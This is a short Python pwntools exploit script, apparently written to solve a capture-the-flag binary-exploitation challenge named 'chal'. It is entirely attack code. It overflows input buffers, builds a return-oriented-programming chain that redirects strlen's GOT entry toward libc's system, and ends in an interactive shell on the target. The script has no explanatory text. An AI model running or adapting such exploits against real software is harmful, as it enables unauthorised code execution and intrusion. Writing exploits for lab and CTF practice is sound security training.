from pwn import *
import subprocess

if args.LOCAL:
    p = remote("localhost", 1337)
    while True:
        try:
            pid = subprocess.run(["pgrep", "-fx", "/app/run"], check=True, capture_output=True, encoding="utf-8").stdout
            pid = int(pid)
            break
        except subprocess.CalledProcessError:
            log.warn("failed to get pid")
    gdb.attach(pid, gdbscript="c", exe="./chal", sysroot=f"/proc/{pid}/root/")
else:
    p = gdb.debug("./chal", gdbscript="c")

file = ELF("./chal", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

p.sendlineafter(b":", b"A" * 0xff + b":" + b"A" * 0x180)
p.sendlineafter(b"!", b"2")

payload = b"A" * 0x138
payload += p64(libc.sym.system - libc.sym.__strlen_avx2 & 0xffffffff)
payload += p64(file.got.strlen + 0x3d)

payload += p64(0x000000000040118c)
payload += p64(file.plt.strlen)
payload += p64(file.sym._fini)
payload += p64(file.sym.main)
p.sendlineafter(b":", payload)

p.sendlineafter(b"!", b"3")

p.interactive()